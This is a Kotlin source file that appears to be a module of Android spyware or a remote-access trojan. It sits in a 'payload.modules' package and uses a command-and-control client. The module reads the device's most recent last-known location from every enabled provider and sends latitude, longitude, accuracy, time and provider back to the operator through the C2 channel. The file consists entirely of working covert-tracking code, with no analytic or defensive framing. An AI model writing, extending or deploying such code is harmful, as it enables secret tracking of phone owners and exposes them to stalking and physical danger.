package com.ihk909.payload.modules

import android.content.Context
import android.location.LocationManager
import com.ihk909.payload.C2Client
import org.json.JSONObject

object LocationModule {
    fun get(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: android.location.Location? = null
            for (p in lm.getProviders(true)) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best.time) best = l
            }
            val r = JSONObject()
            if (best != null) {
                r.put("lat", best.latitude)
                r.put("lon", best.longitude)
                r.put("acc", best.accuracy)
                r.put("ts", best.time)
                r.put("provider", best.provider)
            } else r.put("error", "no last known location")
            c2.reply(id, r)
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}